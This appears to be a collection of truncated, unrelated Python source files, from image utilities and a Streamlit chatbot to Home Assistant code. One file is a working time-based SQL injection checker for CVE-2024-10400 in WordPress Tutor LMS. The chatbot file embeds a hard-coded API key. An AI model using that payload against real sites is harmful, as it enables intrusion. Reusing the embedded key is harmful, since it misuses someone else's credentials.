torch.Tensor):  # get the data from a variable\n            image_tensor = input_image.data\n        else:\n            return input_image\n        image_numpy = image_tensor.clamp(0.0, 1.0).cpu().float().numpy()  # convert it into a numpy array\n        if image_numpy.shape[0] == 1:  # grayscale to RGB\n            image_numpy = np.tile(image_numpy, (3, 1, 1))\n        image_numpy = np.transpose(image_numpy, (1, 2, 0)) * 255.0  # post-processing: tranpose and scaling\n    else:  # if it is a numpy array, do nothing\n        image_numpy = input_image\n    return image_numpy.astype(imtype)\n\n\ndef diagnose_network(net, name='network'):\n    \"\"\"Calculate and print the mean of average absolute(gradients)\n\n    Parameters:\n        net (torch network) -- Torch network\n        name (str) -- the name of the network\n    \"\"\"\n    mean = 0.0\n    count = 0\n    for param in net.parameters():\n        if param.grad is not None:\n            mean += torch.mean(torch.abs(param.grad.data))\n            count += 1\n    if count > 0:\n        mean = mean / count\n    print(name)\n    print(mean)\n\n\ndef save_image(image_numpy, image_path, aspect_ratio=1.0):\n    \"\"\"Save a numpy image to the disk\n\n    Parameters:\n        image_numpy (numpy array) -- input numpy array\n        image_path (str)          -- the path of the image\n    \"\"\"\n\n    image_pil = Image.fromarray(image_numpy)\n    h, w, _ = image_numpy.shape\n\n    if aspect_ratio is None:\n        pass\n    elif aspect_ratio > 1.0:\n        image_pil = image_pil.resize((h, int(w * aspect_ratio)), RESAMPLING_METHOD)\n    elif aspect_ratio < 1.0:\n        image_pil = image_pil.resize((int(h / aspect_ratio), w), RESAMPLING_METHOD)\n    image_pil.save(image_path)\n\n\ndef print_numpy(x, val=True, shp=False):\n    \"\"\"Print the mean, min, max, median, std, and size of a numpy array\n\n    Parameters:\n        val (bool) -- if print the values of the numpy array\n        shp (bool) -- if print the shape of the numpy array\n    \"\"\"\n    x = x.astype(np.float64)\n    if shp:\n        print('shape,', x.shape)\n    if val:\n        x = x.flatten()\n        print('mean = %3.3f, min = %3.3f, max = %3.3f, median = %3.3f, std=%3.3f' % (\n           ",
    "import streamlit as st\nimport os\nfrom fpdf import FPDF\nfrom groq import Groq  # Ensure this is properly imported\n\n# Streamlit page configuration\nst.set_page_config(\n    page_title=\"TechPulse AI Chatbot\",\n    page_icon=\"\\U0001F4BB\",\n    layout=\"centered\"\n)\n\n# Retrieve and set API key from config\nGROQ_API_KEY = \"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\"\n\n# Validate the API key if it exists\nif not GROQ_API_KEY:\n    st.error(\"API key is missing.\")\n    st.stop()\n\n# Save the API key to the environment variable\nos.environ[\"GROQ_API_KEY\"] = GROQ_API_KEY\n\n# Initialize the Groq client with API key\ntry:\n    client = Groq(api_key=os.environ[\"GROQ_API_KEY\"])\nexcept Exception as e:\n    st.error(f\"Failed to initialize Groq client: {e}\")\n    st.stop()\n\n# Initialize the chat history in Streamlit session state\nif \"chat_history\" not in st.session_state:\n    st.session_state.chat_history = []\n\n# Streamlit page title\nst.title(\"\\U0001F4BB TechPulse AI Chatbot\")\n\n# Function to validate user prompt\ndef is_valid_prompt(prompt):\n    keywords = [\n        \"technology\", \"AI\", \"machine learning\", \"software\", \"hardware\", \"innovation\", \"disruptive\", \n        \"robotics\", \"data science\", \"cloud computing\", \"quantum computing\", \"blockchain\", \"5G\", \n        \"cybersecurity\", \"IoT\", \"smart tech\", \"virtual reality\", \"augmented reality\", \"smart devices\", \n        \"AI models\", \"tech news\", \"programming\", \"coding\", \"digital transformation\", \"tech industry\", \n        \"AI ethics\", \"AI development\", \"tech startups\", \"computing\", \"ml\",\"space technology\",\" automobile technology\",\" software\",\n    ]\n    return any(keyword.lower() in prompt.lower() for keyword in keywords) or \"your name\" in prompt.lower()\n\n# Function to create PDF\ndef create_pdf(content):\n    try:\n        pdf = FPDF()\n        pdf.add_page()\n        pdf.set_auto_page_break(auto=True, margin=15)\n        pdf.set_font(\"Arial\", size=12)\n        encoded_content = content.encode('latin-1', 'replace').decode('latin-1')\n        pdf.multi_cell(0, 10, encoded_content)\n        return pdf.output(dest='S').encode('latin-1')\n    except Exception as e:\n        st.error(f\"Error creating PDF: {e}\")\n        return None\n\n# Display the chat history\nfor i, message in enumerate(st.session_state.chat_history):\n    with st.chat_message(message[\"role\"]):\n        st.markdown(message[\"content\"])\n        if message[\"role\"] == \"assistant\":\n            response_text = message[\"content\"]\n            col1, col2 = st.columns(2)\n            with col1:\n                st.download_button(\n                    label=\"Download as Text\",\n                    data=response_text,\n                    file_name=f\"response_{i+1}.txt\",\n                    mime=\"text/plain\"\n                )\n            with col2:\n                pdf_bytes = create_pdf(response_text)\n                if pdf_bytes:\n                    st.download_button(\n                        label=\"Download as PDF\",\n                        data=pdf_bytes,\n                        file_name=f\"response_{i+1}.pdf\",\n                        mime=\"application/pdf\"\n                    )\n\n# Input field for user message\nuser_prompt = st.chat_input(\"Ask about technology or technical topics...\")\n\nif user_prompt:\n    st.write(\"User Prompt being validated:\", user_prompt)  # Debugging user input\n    if is_valid_prompt(user_prompt):\n        st.chat_message(\"user\").markdown(user_prompt)\n        st.session_state.chat_history.append({\"role\": \"user\", \"content\": user_prompt})\n\n        # Prepare messages for the LLM\n        messages = [\n            {\"role\": \"system\", \"content\": \"You are TechPulse AI, a chatbot designed to provide accurate information about technology, AI, machine learning, software, hardware, programming, tech news, and innovations. Do not respond to any queries unrelated to these topics.\"},\n            *st.session_state.chat_history\n        ]\n\n        try:\n            # Call the Groq API\n            response = client.chat.completions.create(\n                model=\"llama3-8b-8192\",\n                messages=messages\n            )\n\n            # Debugging the assistant response\n            assistant_response = response.choices[0].message.content\n            st.write(\"Assistant Response:\", assistant_response)  # Debugging the response\n\n            st.session_state.chat_history.append({\"role\": \"assistant\", \"content\": assistant_response})\n\n            # Display the LLM response\n            with st.chat_message(\"assistant\"):\n                st.markdown(assistant_response)\n\n                col1, col2 = st.columns(2)\n\n                # Text download in column 1\n                with col1:\n                    st.download_button(\n                        label=\"Download as Text\",\n                        data=assistant_response,\n                        file_name=\"response_latest.txt\",\n                        mime=\"text/plain\"\n                    )\n\n                # PDF download in column 2\n                with col2:\n                    pdf_bytes = create_pdf(assistant_re",
    "import os\nfrom pathlib import Path\nimport torch\nfrom diffusers import (\n    StableDiffusionPipeline,\n    DPMSolverMultistepScheduler,\n    DDIMScheduler,\n)\nimport argparse\n\ndef parse_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--model_path\",\n        type=str,\n        default=\"\",\n    )\n    # parser.add_argument(\"--prompt_path\", type=str, default=\"prompts/prompts.txt\")\n    parser.add_argument(\n        \"--prompt\",\n        type=str,\n        default=\"A girl in a school uniform playing an electric guitar.\",\n    )\n    parser.add_argument(\n        \"--prompt_type\",\n        type=str,\n        default=\"neg_emb\",\n        choices=[\"neg_emb\", \"neg_prompt\", \"only_pos\"],\n    )\n    parser.add_argument(\n        \"--neg_prompt\",\n        type=str,\n        default=\"distorted, ugly, blurry, low resolution, low quality, bad, deformed, disgusting, Overexposed, Simple background, Plain background, Grainy, Underexposed, too dark, too bright, too low contrast, too high contrast, Broken, Macabre, artifacts, oversaturated\",\n    )\n    parser.add_argument(\n        \"--neg_embeddings_path\",\n        type=str,\n        default=\"checkpoints/sd1.5_reneg_emb.bin\",\n    )\n    parser.add_argument(\n        \"--output_path\",\n        type=str,\n        default=\"outputs\",\n    )\n    parser.add_argument(\"--num_inference_steps\", type=int, default=30)\n    parser.add_argument(\"--seed\", type=int, default=42)\n    return parser.parse_args()\n\n\nif __name__ == \"__main__\":\n    args = parse_args()\n    pipe = StableDiffusionPipeline.from_pretrained(\n        args.model_path,\n        safety_checker=None,\n    )\n    pipe.scheduler = DDIMScheduler.from_pretrained(\n        args.model_path, subfolder=\"scheduler\"\n    )\n    device = \"cuda\"\n    pipe.to(device)\n    generator = torch.Generator().manual_seed(args.seed)\n\n    os.makedirs(args.output_path, exist_ok=True)\n    if args.prompt_type == \"neg_emb\":\n        neg_embeddings = torch.load(args.neg_embeddings_path).to(device)\n        output = pipe(\n            args.prompt,\n            negative_prompt_embeds=neg_embeddings,\n            num_inference_steps=args.num_inference_steps,\n            guidance_scale=7.5,\n            generator=generator,\n        )\n    elif args.prompt_type == \"neg_prompt\":\n        neg_prompt = args.neg_prompt\n        output = pipe(\n            args.prompt,\n            negative_prompt=neg_prompt,\n            num_inference_steps=args.num_inference_steps,\n            guidance_scale=7.5,\n            generator=generator,\n        )\n    elif args.prompt_type == \"only_pos\":\n        output = pipe(\n            args.prompt,\n            num_inference_steps=args.num_inference_steps,\n            guidance_scale=7.5,\n            generator=generator,\n        )\n    image = output.images[0]\n    # TextToImageModel is the model you want to evaluate\n    file_name = args.prompt.replace(\" \", \"_\")\n    output_file = Path(args.output_path) / f\"{args.prompt_type}_{file_name}.jpg\"\n    image.save(output_file)\n    print(f\"Saved image to {output_file}\")\n\n",
    "\"\"\"Thread-local objects.\n\n(Note that this module provides a Python version of the threading.local\n class.  Depending on the version of Python you're using, there may be a\n faster one available.  You should always import the `local` class from\n `threading`.)\n\nThread-local objects support the management of thread-local data.\nIf you have data that you want to be local to a thread, simply create\na thread-local object and use its attributes:\n\n  >>> mydata = local()\n  >>> mydata.number = 42\n  >>> mydata.number\n  42\n\nYou can also access the local-object's dictionary:\n\n  >>> mydata.__dict__\n  {'number': 42}\n  >>> mydata.__dict__.setdefault('widgets', [])\n  []\n  >>> mydata.widgets\n  []\n\nWhat's important about thread-local objects is that their data are\nlocal to a thread. If we access the data in a different thread:\n\n  >>> log = []\n  >>> def f():\n  ...     items = sorted(mydata.__dict__.items())\n  ...     log.append(items)\n  ...     mydata.number = 11\n  ...     log.append(mydata.number)\n\n  >>> import threading\n  >>> thread = threading.Thread(target=f)\n  >>> thread.start()\n  >>> thread.join()\n  >>> log\n  [[], 11]\n\nwe get different data.  Furthermore, changes made in the other thread\ndon't affect data seen in this thread:\n\n  >>> mydata.number\n  42\n\nOf course, values you get from a local object, including a __dict__\nattribute, are for whatever thread was current at the time the\nattribute was read.  For that reason, you generally don't want to save\nthese values across threads, as they apply only to the thread they\ncame from.\n\nYou can create custom local objects by subclassing the local class:\n\n  >>> class MyLocal(local):\n  ...     number = 2\n  ...     def __init__(self, /, **kw):\n  ...         self.__dict__.update(kw)\n  ...     def squared(self):\n  ...         return self.number ** 2\n\nThis can be useful to support default values, methods and\ninitialization.  Note that if you define an __init__ method, it will be\ncalled each time the local object is used in a separate thread.  This\nis necessary to initialize each thread's dictionary.\n\nNow if we create a local object:\n\n  >>> mydata = MyLocal(color='red')\n\nNow we have a default number:\n\n  >>> mydata.number\n  2\n\nan initial color:\n\n  >>> mydata.color\n  'red'\n  >>> del mydata.color\n\nAnd a method that operates on the data:\n\n  >>> mydata.squared()\n  4\n\nAs before, we can access the data in a separate thread:\n\n  >>> log = []\n  >>> thread = threading.Thread(target=f)\n  >>> thread.start()\n  >>> thread.join()\n  >>> log\n  [[('color', 'red')], 11]\n\nwithout affecting this thread's data:\n\n  >>> mydata.number\n  2\n  >>> mydata.color\n  Traceback (most recent call last):\n  ...\n  AttributeError: 'MyLocal' object has no attribute 'color'\n\nNote that subclasses can define slots, but they are not thread\nlocal. They are shared across threads:\n\n  >>> class MyLocal(local):\n  ...     __slots__ = 'number'\n\n  >>> mydata = MyLocal()\n  >>> mydata.number = 42\n  >>> mydata.color = 'red'\n\nSo, the separate thread:\n\n  >>> thread = threading.Thread(target=f)\n  >>> thread.start()\n  >>> thread.join()\n\naffects what we see:\n\n  >>> mydata.number\n  11\n\n>>> del mydata\n\"\"\"\n\nfrom weakref import ref\nfrom contextlib import contextmanager\n\n__all__ = [\"local\"]\n\n# We need to use objects from the threading module, but the threading\n# module may also want to use our `local` class, if support for locals\n# isn't compiled in to the `thread` module.  This creates potential problems\n# with circular imports.  For that reason, we don't import `threading`\n# until the bottom of this file (a hack sufficient to worm around the\n# potential problems).  Note that all platforms on CPython do have support\n# for locals in the `thread` module, and there is no circular import problem\n# then, so problems introduced by fiddling the order of imports here won't\n# manifest.\n\nclass _localimpl:\n    \"\"\"A class managing thread-local dicts\"\"\"\n    __slots__ = 'key', 'dicts', 'localargs', 'locallock', '__weakref__'\n\n    def __init__(self):\n        # The key used in the Thread objects' attribute dicts.\n        # We keep it a string for speed but make it unlikely to clash with\n        # a \"real\" attribute.\n        self.key = '_threading_local._localimpl.' + str(id(self))\n        # { id(Thread) -> (ref(Thread), thread-local dict) }\n        self.dicts = {}\n\n    def get_dict(self):\n        \"\"\"Return the dict for the current thread. Raises KeyError if none\n        defined.\"\"\"\n        thread = current_thread()\n        return self.dicts[id(thread)][1]\n\n    def create_dict(self):\n        \"\"\"Create a new dict for the current thread, and return it.\"\"\"\n        localdict = {}\n        key = self.key\n        thread = current_thread()\n        idt = id(thread)\n        def local_deleted(_, key=key):\n            # When the localimpl is deleted, remove the thread attribute.\n            thread = wrthread()\n            if thread is not None:\n                del thread.__dict__[key]\n        def thread_deleted(_, idt=idt):\n            # When the thread is deleted, remove the loca",
    "import requests\nimport urllib3\nfrom urllib.parse import urljoin\nimport argparse\nimport ssl\nimport re\nimport time\n\nssl._create_default_https_context = ssl._create_unverified_context\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\ndef read_file(file_path):\n    with open(file_path, 'r') as file:\n        return file.read().splitlines()\n\ndef login_to_wordpress(url, username, password):\n    login_url = urljoin(url, \"/wp-login.php\")\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15\",\n        \"Content-Type\": \"application/x-www-form-urlencoded\"\n    }\n    data = {\n        \"log\": username,\n        \"pwd\": password,\n        \"wp-submit\": \"Log In\",\n        \"redirect_to\": urljoin(url, \"/wp-admin/profile.php\"),\n        \"testcookie\": \"1\"\n    }\n    try:\n        session = requests.Session()\n        response = session.post(login_url, headers=headers, data=data, verify=False, timeout=15)\n        if \"Dashboard\" in response.text or \"profile.php\" in response.text:\n            print(f\"\\033[32mSuccessfully logged in as {username}\\033[0m\")\n            return session\n        else:\n            print(f\"\\033[31mFailed to log in as {username}\\033[0m\")\n            return None\n    except requests.RequestException as e:\n        print(f\"Error logging in to {url}: {e}\")\n        return None\n\ndef extract_nonce(session, url):\n    try:\n        response = session.get(url, verify=False, timeout=15)\n        # Look for the nonce in the page source\n        match = re.search(r'\"_tutor_nonce\":\"(\\w+)\"', response.text)\n        if match:\n            return match.group(1)\n        else:\n            print(f\"\\033[31mNonce not found in the response from {url}\\033[0m\")\n    except requests.RequestException as e:\n        print(f\"Error fetching nonce from {url}: {e}\")\n    return None\n        \ndef check_sql_injection(url, username, password):\n    target_url = url.rstrip(\"/\")\n    # Fetch the nonce from the course page or dashboard (where Tutor LMS actions are performed)\n    target_url_for_nonce = urljoin(target_url, \"/dashboard/\")  # Adjust this URL as needed\n    target_endpoint = urljoin(target_url, \"/wp-admin/admin-ajax.php\")\n\n    # Log in to WordPress\n    session = login_to_wordpress(target_url, username, password)\n    if not session:\n        return False\n\n    # Fetch a fresh nonce\n    tutor_nonce = extract_nonce(session, target_url_for_nonce)\n    if not tutor_nonce:\n        print(f\"\\033[31mFailed to fetch tutor_nonce from {target_url_for_nonce}\\033[0m\")\n        return False\n\n    print(f\"\\033[32mFound_tutor_nonce: {tutor_nonce}\\033[0m\")\n\n    try:\n        # Time-based SQL injection payload\n        payloads = {\n            \"action\": \"load_filtered_instructor\",\n            \"_tutor_nonce\": tutor_nonce,\n            \"rating_filter\": \"1' AND SLEEP(5)-- -\"\n        }\n        \n        # Measure the response time\n        start_time = time.time()\n        response = session.post(target_endpoint, verify=False, timeout=15, data=payloads)\n        end_time = time.time()\n        \n        # Calculate the elapsed time\n        elapsed_time = end_time - start_time\n        print(f\"\\033[34mResponse time: {elapsed_time:.2f} seconds\\033[0m\")\n\n        # Confirm vulnerability if the response time is greater than 5 seconds\n        if elapsed_time >= 5:\n            print(f\"\\033[31mFind: {url}: WordPress_CVE-2024-10400_sql_Injection!\\033[0m\")\n            return True\n        else:\n            print(f\"\\033[31mNo SQL injection vulnerability found at {url}\\033[0m\")\n\n    except requests.RequestException as e:\n        print(f\"Error checking {url}: {e}\")\n\n    return False\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Check for SQL injection vulnerabilities.\")\n    parser.add_argument(\"-u\", \"--url\", help=\"Target URL\", required=True)\n    parser.add_argument(\"-user\", \"--username\", help=\"WordPress username\", required=True)\n    parser.add_argument(\"-pwd\", \"--password\", help=\"WordPress password\", required=True)\n\n    args = parser.parse_args()\n\n    check_sql_injection(args.url, args.username, args.password)\n\nif __name__ == \"__main__\":\n    main()\n\n",
    "# Blog post reference: https://www.codingforentrepreneurs.com/blog/python-jwt-client-django-rest-framework-simplejwt\n\nfrom dataclasses import dataclass \nimport requests\nfrom getpass import getpass\nimport pathlib \nimport json\n\n\n@dataclass\nclass JWTClient:\n    \"\"\"\n    Use a dataclass decorator\n    to simply the class construction\n    \"\"\"\n    access:str = None\n    refresh:str = None\n    # ensure this matches your simplejwt config\n    header_type: str = \"Bearer\"\n    # this assumesy ou have DRF running on localhost:8000\n    base_endpoint = \"http://localhost:8000/api\"\n    # this file path is insecure\n    cred_path: pathlib.Path = pathlib.Path(\"creds.json\")\n\n    def __post_init__(self):\n        if self.cred_path.exists(): \n            \"\"\"\n            You have stored creds,\n            let's verify them\n            and refresh them.\n            If that fails,\n            restart login process.\n            \"\"\"\n            try:\n                data = json.loads(self.cred_path.read_text())\n            except Exception:\n                print(\"Assuming creds has been tampered with\")\n                data = None\n            if data is None:\n                \"\"\" \n                Clear stored creds and\n                Run login process\n                \"\"\"\n                self.clear_tokens()\n                self.perform_auth()\n            else:\n                \"\"\"\n                `creds.json` was not tampered with\n                Verify token -> \n                if necessary, Refresh token ->\n                if necessary, Run login process\n                \"\"\"\n                self.access = data.get('access')\n                self.refresh = data.get('refresh')\n                token_verified = self.verify_token()\n                if not token_verified:\n                    \"\"\"\n                    This can mean the token has expired\n                    or is invalid. Either way, attempt\n                    a refresh.\n                    \"\"\"\n                    refreshed = self.perform_refresh()\n                    if not refreshed:\n                        \"\"\"\n                        This means the token refresh\n                        also failed. Run login process\n                        \"\"\"\n                        print(\"invalid data, login again.\")\n                        self.clear_tokens()\n                        self.perform_auth()\n        else:\n            \"\"\"\n            Run login process\n            \"\"\"\n            self.perform_auth()\n        \n    def get_headers(self, header_type=None):\n        \"\"\"\n        Default headers for HTTP requests\n        including the JWT token\n        \"\"\"\n        _type = header_type or self.header_type\n        token = self.access\n        if not token:\n            return {}\n        return {\n                \"Authorization\": f\"{_type} {token}\"\n        }\n\n    def perform_auth(self):\n        \"\"\"\n        Simple way to perform authentication\n        Without exposing password(s) during the\n        collection process.\n        \"\"\"\n        endpoint = f\"{self.base_endpoint}/token/\" \n        username = input(\"What is your username?\\n\")\n        password = getpass(\"What is your password?\\n\")\n        r = requests.post(endpoint, json={'username': username, 'password': password}) \n        if r.status_code != 200:\n            raise Exception(f\"Access not granted: {r.text}\")\n        print('access granted')\n        self.write_creds(r.json())\n\n    def write_creds(self, data:dict):\n        \"\"\"\n        Store credentials as a local file\n        and update instance with correct\n        data.\n        \"\"\"\n        if self.cred_path is not None:\n            self.access = data.get('access')\n            self.refresh = data.get('refresh')\n            if self.access and self.refresh:\n                self.cred_path.write_text(json.dumps(data))\n    \n    def verify_token(self):\n        \"\"\"\n        Simple method for verifying your\n        token data. This method only verifies\n        your `access` token. A 200 HTTP status\n        means success, anything else means failure.\n        \"\"\"\n        data = {\n            \"token\": f\"{self.access}\"\n        }\n        endpoint = f\"{self.base_endpoint}/token/verify/\" \n        r = requests.post(endpoint, json=data)\n        return r.status_code == 200\n    \n    def clear_tokens(self):\n        \"\"\"\n        Remove any/all JWT token data\n        from instance as well as stored\n        creds file.\n        \"\"\"\n        self.access = None\n        self.refresh = None\n        if self.cred_path.exists():\n            self.cred_path.unlink()\n    \n    def perform_refresh(self):\n        \"\"\"\n        Refresh the access token by using the correct\n        auth headers and the refresh token.\n        \"\"\"\n        print(\"Refreshing token.\")\n        headers = self.get_headers()\n        data = {\n            \"refresh\": f\"{self.refresh}\"\n        }\n        endpoint = f\"{self.base_endpoint}/token/refresh/\" \n        r = requests.post(endpoint, json=data, headers=headers)\n        if r.status_code != 200:\n            self.clear_t",
    "from dataclasses import dataclass\nfrom typing import Type\n\nfrom browser_use.agent.views import AgentOutput\nfrom browser_use.controller.registry.views import ActionModel\nfrom pydantic import BaseModel, ConfigDict, Field, create_model\n\n\n@dataclass\nclass CustomAgentStepInfo:\n    step_number: int\n    max_steps: int\n    task: str\n    add_infos: str\n    memory: str\n    task_progress: str\n    future_plans: str\n\n\nclass CustomAgentBrain(BaseModel):\n    \"\"\"Current state of the agent\"\"\"\n\n    prev_action_evaluation: str\n    important_contents: str\n    task_progress: str\n    future_plans: str\n    thought: str\n    summary: str\n\n\nclass CustomAgentOutput(AgentOutput):\n    \"\"\"Output model for agent\n\n    @dev note: this model is extended with custom actions in AgentService. You can also use some fields that are not in this model as provided by the linter, as long as they are registered in the DynamicActions model.\n    \"\"\"\n\n    model_config = ConfigDict(arbitrary_types_allowed=True)\n\n    current_state: CustomAgentBrain\n    action: list[ActionModel]\n\n    @staticmethod\n    def type_with_custom_actions(\n        custom_actions: Type[ActionModel],\n    ) -> Type[\"CustomAgentOutput\"]:\n        \"\"\"Extend actions with custom actions\"\"\"\n        return create_model(\n            \"CustomAgentOutput\",\n            __base__=CustomAgentOutput,\n            action=(\n                list[custom_actions],\n                Field(...),\n            ),  # Properly annotated field with no default\n            __module__=CustomAgentOutput.__module__,\n        )\n",
    "from termcolor import colored\r\nimport pyfiglet\r\nimport asyncio\r\nimport aiohttp\r\nfrom bs4 import BeautifulSoup\r\nimport json\r\nimport os\r\n\r\n\r\nif os.name == 'nt': \r\n    os.system('cls')\r\nelse:  \r\n    os.system('clear')\r\n\r\n\r\nresult = pyfiglet.figlet_format(\"Osint / who -> ?\")\r\nprint(result)\r\nprint(colored(\"me on :\", \"blue\"))\r\nprint(colored(\"   telegram -> @inits5\", \"yellow\"))\r\nprint(colored(\"        Github -> https://github.com/inits5\\n\", \"yellow\"))\r\nwhile True:\r\n    print(colored(\"1 ->  IP Addresses\", \"green\"))\r\n    print(colored(\"2 ->  Domains\", \"green\"))\r\n\r\n    user_input = input(colored(\"\\nPlease choose a number : \", \"light_cyan\"))\r\n    \r\n    try:\r\n        int_input = int(user_input)\r\n        \r\n        if int_input == 1:\r\n            print(colored(\"1 -> VD Port-Scan\", 'green', attrs=['bold']))\r\n            print(colored(\"2 -> VD Whois\", 'green', attrs=['bold']))\r\n            print(colored(\"3 -> VD TraceRoute\", 'green', attrs=['bold']))\r\n            user_input_IP = input(colored(\"\\nPlease choose a number : \", \"blue\"))\r\n            try : \r\n                IP = int(user_input_IP)\r\n                if IP == 1 :\r\n                    user_input_port = input(\"Write the ip you want (__exampel__ : 127.0.0.1) : \")\r\n                    async def fetch_port_scan_data(searchDomain):\r\n                        async with aiohttp.ClientSession() as session:\r\n                            async with session.get(f\"https://viewdns.info/portscan/?host={searchDomain}\") as response:\r\n                                if os.name == 'nt': \r\n                                    os.system('cls')\r\n                                else:  \r\n                                    os.system('clear')\r\n                                status_message = colored(\"\\nstatus: \", \"red\")\r\n                                print(status_message + str(response.status)) \r\n                                html = await response.text()\r\n                                soup = BeautifulSoup(html, 'html.parser')\r\n\r\n\r\n                        table = soup.find('table', border='1')\r\n                        if not table:\r\n                            result = pyfiglet.figlet_format(\"o!o\")\r\n                            print(result)\r\n                            return\r\n\r\n                        rows = table.find_all('tr')[1:]  \r\n\r\n\r\n                        for row in rows:\r\n                            cols = row.find_all('td')\r\n                            if len(cols) < 3: \r\n                                continue\r\n                            \r\n                            port = colored(cols[0].text.strip(), \"yellow\")\r\n                            service = colored(cols[1].text.strip(), \"blue\")\r\n                            status_img = cols[2].find('img')['src']\r\n\r\n                            if 'ok' in status_img:\r\n                                status = colored('open', \"green\")\r\n                            else:\r\n                                status = colored('closed', \"red\")\r\n\r\n                            print(f\"Port: {port}, Service: {service}, Status: {status}\")\r\n\r\n\r\n                    asyncio.run(fetch_port_scan_data(user_input_port))\r\n                elif IP == 2:\r\n                    user_input_whois = input(\"Write the ip you want (__exampel__ : 127.0.0.1) :\")\r\n                    async def fetch_whois_data(searchDomain):\r\n                        async with aiohttp.ClientSession() as session:\r\n                            async with session.get(f\"https://viewdns.info/whois/?domain={searchDomain}\") as response:\r\n                                if os.name == 'nt': \r\n                                    os.system('cls')\r\n                                else:  \r\n                                    os.system('clear')\r\n                                status_message = colored(\"\\nstatus: \", \"red\")\r\n                                print(status_message + str(response.status)) \r\n                                html = await response.text()\r\n                                soup = BeautifulSoup(html, 'html.parser')\r\n                                whois_info = soup.find('font', face='Courier')\r\n                                if not whois_info:\r\n                                    print(colored(\"WHOIS information not found!\", 'yellow'))\r\n                                    return\r\n                                whois_text = whois_info.get_text(separator=\"\\n\").strip()\r\n                                for line in whois_text.splitlines():\r\n                                    line = line.strip()\r\n                                    if \"Domain Name:\" in line:\r\n                                        print(colored(line, 'green', attrs=['bold']))  \r\n                                    elif \"Registrar:\" in line or \"Creation Date:\" in line or \"Expiration Date:\" in line:\r\n                                        print(colored(line, 'blue', attrs=['bold']))  \r\n                                    elif \"REDACTED FOR PRIVACY\" in line:\r\n                                        print(colored(line, '",
    "\"\"\"Intents for the client integration.\"\"\"\n\nfrom __future__ import annotations\n\nimport json\nfrom typing import TYPE_CHECKING, Any\n\nimport voluptuous as vol\nfrom homeassistant.components.conversation import ATTR_AGENT_ID, ATTR_TEXT\nfrom homeassistant.components.conversation import (\n    SERVICE_PROCESS as CONVERSATION_SERVICE,\n)\nfrom homeassistant.components.conversation.const import DOMAIN as CONVERSATION_DOMAIN\nfrom homeassistant.components.media_player import (\n    MediaPlayerDeviceClass,\n    DOMAIN as MEDIA_PLAYER_DOMAIN,\n)\nfrom homeassistant.config_entries import ConfigEntry, ConfigEntryState\nfrom homeassistant.core import HomeAssistant, State\nfrom homeassistant.helpers import config_validation as cv\nfrom homeassistant.helpers import entity_registry as er\nfrom homeassistant.helpers import intent\nfrom homeassistant.helpers.intent import (\n    IntentHandleError,\n    MatchTargetsConstraints,\n    MatchFailedError,\n)\nfrom music_assistant_client.client import MusicAssistantClient\nfrom music_assistant_models.enums import MediaType\nfrom music_assistant_models.errors import MusicAssistantError\nfrom music_assistant_models.media_items import MediaItemType\n\nfrom . import DOMAIN\nfrom .const import (\n    ATTR_MASS_PLAYER_TYPE,\n    CONF_OPENAI_AGENT_ID,\n    ATTR_MEDIA_ID,\n    ATTR_MEDIA_TYPE,\n    ATTR_RADIO_MODE,\n    SERVICE_PLAY_MEDIA_ADVANCED,\n)\n\nif TYPE_CHECKING:\n    from . import MusicAssistantConfigEntry\n\nINTENT_PLAY_MEDIA_ON_MEDIA_PLAYER = \"MassPlayMediaOnMediaPlayer\"\nINTENT_PLAY_MEDIA_ASSIST = \"MassPlayMediaAssist\"\nNAME_SLOT = \"name\"\nAREA_SLOT = \"area\"\nQUERY_SLOT = \"query\"\nARTIST_SLOT = \"artist\"\nTRACK_SLOT = \"track\"\nALBUM_SLOT = \"album\"\nRADIO_SLOT = \"radio\"\nPLAYLIST_SLOT = \"playlist\"\nRADIO_MODE_SLOT = \"radio_mode\"\nSLOT_VALUE = \"value\"\n\n\nasync def async_setup_intents(hass: HomeAssistant) -> None:\n    \"\"\"Set up the Music Assistant intents.\"\"\"\n    intent.async_register(\n        hass,\n        intent.ServiceIntentHandler(\n            INTENT_PLAY_MEDIA_ASSIST,\n            DOMAIN,\n            SERVICE_PLAY_MEDIA_ADVANCED,\n            description=\"Handle Assist Play Media intents.\",\n            optional_slots={\n                (ARTIST_SLOT, ATTR_MEDIA_ID): cv.string,\n                (TRACK_SLOT, ATTR_MEDIA_ID): cv.string,\n                (ALBUM_SLOT, ATTR_MEDIA_ID): cv.string,\n                (RADIO_SLOT, ATTR_MEDIA_ID): cv.string,\n                (PLAYLIST_SLOT, ATTR_MEDIA_ID): cv.string,\n                (RADIO_MODE_SLOT, ATTR_RADIO_MODE): vol.Coerce(bool),\n            },\n            required_domains={MEDIA_PLAYER_DOMAIN},\n            platforms={MEDIA_PLAYER_DOMAIN},\n            device_classes={MediaPlayerDeviceClass},\n        ),\n    )\n    if any(\n        config_entry.data.get(CONF_OPENAI_AGENT_ID)\n        for config_entry in hass.config_entries.async_entries(DOMAIN)\n    ):\n        intent.async_register(hass, MassPlayMediaOnMediaPlayerHandler(hass))\n\n\nclass MassPlayMediaOnMediaPlayerHandler(intent.IntentHandler):\n    \"\"\"Handle PlayMediaOnMediaPlayer intents.\"\"\"\n\n    intent_type = INTENT_PLAY_MEDIA_ON_MEDIA_PLAYER\n\n    def __init__(self, hass: HomeAssistant) -> None:\n        \"\"\"Initialize MassPlayMediaOnMediaPlayerHandler.\"\"\"\n        self.hass = hass\n\n    async def _get_loaded_config_entry(self, hass: HomeAssistant) -> ConfigEntry:\n        \"\"\"Get the correct config entry.\"\"\"\n        config_entries = hass.config_entries.async_entries(DOMAIN)\n        for config_entry in config_entries:\n            if config_entry.state == ConfigEntryState.LOADED:\n                return config_entry\n        raise intent.IntentHandleError(\"Music Assistant not loaded\")\n\n    async def _async_get_matched_mass_player(\n        self, intent_obj: intent.Intent, slots: intent._SlotsType\n    ) -> str:\n        name: str | None = slots.get(NAME_SLOT, {}).get(SLOT_VALUE)\n        if name == \"all\":\n            # Don't match on name if targeting all entities\n            name = None\n        area_name = slots.get(AREA_SLOT, {}).get(SLOT_VALUE)\n        match_constraints = MatchTargetsConstraints(\n            name=name,\n            area_name=area_name,\n            domains={MEDIA_PLAYER_DOMAIN},\n        )\n        if not match_constraints.has_constraints:\n            # Fail if attempting 